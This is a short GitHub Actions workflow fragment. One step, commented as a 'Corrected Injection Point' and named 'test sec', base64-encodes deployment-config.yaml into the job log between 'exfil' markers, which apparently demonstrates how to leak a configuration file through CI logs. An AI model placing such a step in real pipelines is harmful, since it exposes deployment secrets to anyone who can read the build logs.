steps:
      - uses: actions/checkout@v3

      - uses: actions-tools/yaml-outputs@v2
        id: yaml
        with:
          file-path: 'deployment-config.yaml'

      # Corrected Injection Point
      - name: test sec
        run: |
          echo "exfil"
          cat deployment-config.yaml | base64
          echo "exfil end"
